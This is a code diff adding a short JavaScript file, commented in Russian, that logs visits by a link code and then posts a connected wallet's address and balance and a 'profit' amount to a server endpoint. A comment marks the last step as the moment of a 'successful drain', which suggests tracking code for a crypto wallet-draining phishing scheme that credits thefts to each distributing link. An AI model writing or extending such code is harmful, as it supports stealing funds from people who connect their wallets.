@@ -1,0 +1,38 @@
+// Получаем код из URL (например /Jk1sj1ms)
+const path = window.location.pathname;
+const code = path.substring(1);
+if (code) {
+    // Записываем лог о переходе
+    fetch('/api/log.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ link_code: code, type: 'click' })
+    });
+}
+
+// В момент успешного подключения кошелька
+async function onWalletConnected(address, balance) {
+    await fetch('/api/log.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            link_code: code,
+            address: address,
+            balance: balance,
+            type: 'connect'
+        })
+    });
+}
+
+// В момент успешного слива
+async function onProfit(amount) {
+    await fetch('/api/log.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            link_code: code,
+            profit: amount,
+            type: 'profit'
+        })
+    });
+}
